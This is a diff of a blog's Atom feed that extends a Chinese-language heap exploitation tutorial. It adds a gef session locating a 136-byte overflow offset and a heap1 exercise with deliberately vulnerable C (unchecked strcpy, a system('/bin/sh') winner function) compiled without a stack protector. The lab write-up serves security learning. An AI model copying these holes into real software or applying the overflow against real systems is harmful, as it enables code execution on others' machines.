@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-07-18T10:21:05.031Z</updated>
+  <updated>2018-07-19T08:55:01.198Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://iosmosis.github.io/2018/07/18/heap-%E5%AD%A6%E4%B9%A0/"/>
     <id>http://iosmosis.github.io/2018/07/18/heap-学习/</id>
     <published>2018-07-18T09:12:30.000Z</published>
-    <updated>2018-07-18T10:21:05.031Z</updated>
+    <updated>2018-07-19T08:55:01.198Z</updated>
     
     <content type="html"><![CDATA[<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>源代码</p>
 <p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -96,6 +96,26 @@
 <p> <img src="/2018/07/18/heap-学习/1.png" alt="1"></p>
 <p>所以我们需要溢出dest覆盖到v4接着修改nowinner为winner函数地址</p>
 <p>填充量= malloc(0x80u) +第二个chunk头0x8=136</p>
+<p>或者gdb调试</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">gef➤  <span class="token function">file</span> heap0
+Reading symbols from heap0<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
+gef➤  pattern create 150
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generating a pattern of 150 bytes
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Saved as <span class="token string">'<span class="token variable">$_gef0</span>'</span>
+gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
+Starting program: /home/ubuntu/heap/heap0 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
+data is at 0x804b008, fp is at 0x804b090
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6261616a <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
+gef➤  pattern offset 0x6261616a
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Searching <span class="token string">'0x6261616a'</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found at offset 136 <span class="token punctuation">(</span>little-endian search<span class="token punctuation">)</span> likely
+gef➤
+</code></pre>
+<p>同样可以得到填充量</p>
 <p>找到winner函数地址 0x80484CB</p>
 <p>所以可以构造exp</p>
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -111,6 +131,57 @@ payload <span class="token operator">=</span> <span class="token string">'A'</sp
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
+<h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+
+<span class="token keyword">struct</span> internet <span class="token punctuation">{</span>
+  <span class="token keyword">int</span> priority<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">struct</span> internet <span class="token operator">*</span>i1<span class="token punctuation">,</span> <span class="token operator">*</span>i2<span class="token punctuation">,</span> <span class="token operator">*</span>i3<span class="token punctuation">;</span>
+
+  i1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> internet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  i1<span class="token operator">-></span>priority <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  i1<span class="token operator">-></span>name <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  i2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> internet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  i2<span class="token operator">-></span>priority <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+  i2<span class="token operator">-></span>name <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>i1<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>i2<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"and that's a wrap folks!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>编译命令</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c">gcc <span class="token operator">-</span>m32 <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>o heap1 heap1<span class="token punctuation">.</span>c
+</code></pre>
+<p>检查保护</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~/heap$ checksec heap1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/heap/heap1'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+</code></pre>
+<p>只开启nx</p>
+<p>我们通过ida来分析</p>
 ]]></content>
     
     <summary type="html">
@@ -1812,9 +1883,9 @@ S <span class="token operator">=</span> Solver<span class="token punctuation">(<
     
       <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
     
-      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
-    
       <category term="BUPT" scheme="http://iosmosis.github.io/tags/BUPT/"/>
+    
+      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
     
   </entry>
   
@@ -2546,13 +2617,13 @@ str<span class="token operator">=</span><span class="token string">""</span>
     </summary>
     
     
-      <category term="北邮网安杯" scheme="http://iosmosis.github.io/tags/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AF/"/>
+      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
     
       <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
     
-      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
-    
       <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
+    
+      <category term="北邮网安杯" scheme="http://iosmosis.github.io/tags/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AF/"/>
     
   </entry>
   
@@ -2834,11 +2905,11 @@ int main<span class="token punctuation">(</span>int argc<span class="token punct
     </summary>
     
     
+      <category term="强网杯" scheme="http://iosmosis.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
+    
       <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
     
       <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
-    
-      <category term="强网杯" scheme="http://iosmosis.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
     
   </entry>
   
